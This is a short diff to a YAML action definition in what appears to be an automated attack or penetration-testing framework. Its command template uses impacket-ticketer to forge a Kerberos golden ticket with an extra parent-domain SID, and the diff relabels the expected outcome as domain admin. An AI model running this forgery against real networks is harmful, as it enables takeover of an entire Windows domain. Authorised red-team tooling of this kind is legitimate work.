@@ -7,9 +7,10 @@ parameters:
   target_ip: from_engagement.target_ip
 command_template: impacket-ticketer -nthash '{krbtgt_hash}' -domain-sid '{child_sid}'
   -extra-sid '{parent_da_sid}' -domain {child_domain} Administrator
-parser: null
+parser: impacket_parser
 expected_effects:
-- action_completed
+- sid_history_added
+- domain_admin
 falsifier:
   pattern: error|failed|refused|denied
   timeout: 30
